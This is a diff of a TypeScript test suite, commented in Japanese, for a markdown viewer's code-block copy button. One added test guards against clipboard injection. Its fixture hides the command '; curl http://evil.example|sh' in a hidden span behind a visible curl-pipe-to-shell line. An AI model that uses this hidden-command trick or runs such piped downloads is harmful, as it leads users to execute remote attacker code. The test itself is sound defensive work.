@@ -142,10 +142,92 @@ describe("コードブロックのコピーボタン", () => {
     // 偽物 + 本物で 2 つ。本物は末尾（`appendChild`）で、押すとコピーできる
     const buttons = copyButtons(h);
     expect(buttons.length).toBe(2);
-    h.click(buttons[buttons.length - 1] as Element);
+    const fake = buttons.find((b) => b.textContent === "にせもの") as HTMLElement;
+    const real = buttons.find((b) => b !== fake) as HTMLElement;
+    h.click(real);
     await h.flush(4);
-    // **偽物のラベルは混ざらない**（ボタンは `<code>` の外にある）
+    // **偽物のラベルは混ざらない**（ボタンは `<pre>` の外にある）
     expect(h.clipboard).toEqual(["real content\n"]);
+
+    // **言語切替が利用者の要素へ i18n を書き込まない。**
+    // `sanitize-config.js` が `data-i18n*` を禁じているのと同じ趣旨（経路が class に
+    // 変わっただけ）。偽物に aria-label が生えたら漏れている
+    h.click(h.q('.lang-toggle-btn[data-lang-mode="en"]'));
+    await h.flush(4);
+    expect(fake.hasAttribute("aria-label")).toBe(false);
+    expect(real.getAttribute("aria-label")).toContain("Copy");
+  });
+
+  test("画面に出ていない文字はコピーされない（clipboard injection を塞ぐ）", async () => {
+    // `src/renderer.ts` は raw HTML の `<pre>` をそのまま通し、サニタイザは `hidden` を
+    // 落とさない（実測）。`textContent` を使うと**見えていないコマンドが端末へ貼られる**
+    const files = defaultFiles();
+    files["README.md"] = {
+      raw: "# README\n",
+      html:
+        "<pre><code>curl https://good.example/i.sh | sh" +
+        "<span hidden>; curl http://evil.example|sh</span>" +
+        "</code></pre>",
+      sha: "sha-readme-hidden",
+    };
+    h = await bootApp({ files });
+
+    h.click(copyButtons(h)[0] as Element);
+    await h.flush(4);
+
+    expect(h.clipboard).toEqual(["curl https://good.example/i.sh | sh"]);
+    expect(h.clipboard[0]).not.toContain("evil.example");
+  });
+
+  test("編集して保存した直後もボタンが残る", async () => {
+    // プレビューを作り直す経路は `app-preview.js` だけではない。`app-editor.js` の
+    // 保存後 (`saveEdit`) にも `innerHTML` の代入があり、そこで呼び忘れると
+    // **保存した瞬間だけボタンが消える**（ファイルを切り替えるまで戻らない）
+    h = await bootApp({ files: filesWithCode() });
+    expect(copyButtons(h)).toHaveLength(1);
+    // ハーネスの既定は `<p>` 包みなので、保存後の HTML にもコードブロックを含ませる
+    // （**この差し替えを忘れると「ボタンが消えた」に見えるが、原因は fixture**）
+    h.renderHtml = (raw) => `<pre><code class="language-js">${raw}</code></pre>`;
+
+    h.click(h.el("edit-btn"));
+    await h.flush(4);
+    const editor = h.el<HTMLTextAreaElement>("editor");
+    editor.value = "# README\n\n```js\nconst b = 2;\n```\n";
+    editor.dispatchEvent(new h.window.Event("input"));
+    await h.flush(2);
+
+    h.keydown(h.document, { key: "s", code: "KeyS", ctrlKey: true });
+    await h.flush(8);
+
+    expect(h.el("status").textContent).toContain("保存");
+    expect(copyButtons(h)).toHaveLength(1);
+  });
+
+  test("非セキュアコンテキストではフォールバックで書き込む（DoD の HTTP 経路）", async () => {
+    // ハーネスは `isSecureContext` を true に固定しているので、明示的に落とさないと
+    // **フォールバック経路には 1 度も入らない**（`--share` で LAN から HTTP で開いた状態）
+    h = await bootApp({ files: filesWithCode() });
+    Object.defineProperty(h.window, "isSecureContext", { value: false, configurable: true });
+    /** @type {string[]} */
+    const selected: string[] = [];
+    (h.document as unknown as { execCommand: (c: string) => boolean }).execCommand = () => {
+      const ta = h.document.activeElement as HTMLTextAreaElement | null;
+      if (ta?.tagName === "TEXTAREA") selected.push(ta.value);
+      return true;
+    };
+
+    h.click(copyButtons(h)[0] as Element);
+    await h.flush(4);
+
+    // clipboard API は使われず、非表示 textarea 経由で入る
+    expect(h.clipboard).toEqual([]);
+    expect(selected).toEqual(["const a = 1;\n"]);
+    expect(copyButtons(h)[0]?.classList.contains("is-copied")).toBe(true);
+  });
+
+  test("ボタンの読み上げ名に言語が入る（同名が並ばない）", async () => {
+    h = await bootApp({ files: filesWithCode() });
+    expect(copyButtons(h)[0]?.getAttribute("aria-label")).toBe("js のコードブロックをコピー");
   });
 
   test("読み取り専用のテキストファイル表示にも出る", async () => {
@@ -176,13 +258,13 @@ describe("コードブロックのコピーボタン", () => {
   test("言語を切り替えるとボタンの文言も切り替わる", async () => {
     h = await bootApp({ files: filesWithCode() });
     const button = copyButtons(h)[0] as HTMLElement;
-    expect(button.getAttribute("aria-label")).toBe("このコードブロックをコピー");
+    expect(button.getAttribute("aria-label")).toBe("js のコードブロックをコピー");
 
     // ⋮ メニューではなく topbar の言語トグルを押す
     h.click(h.q('.lang-toggle-btn[data-lang-mode="en"]'));
     await h.flush(4);
 
-    expect(button.getAttribute("aria-label")).toBe("Copy this code block");
+    expect(button.getAttribute("aria-label")).toBe("Copy this js code block");
   });
 
   test("コピーに失敗したらステータスにエラーを出す", async () => {
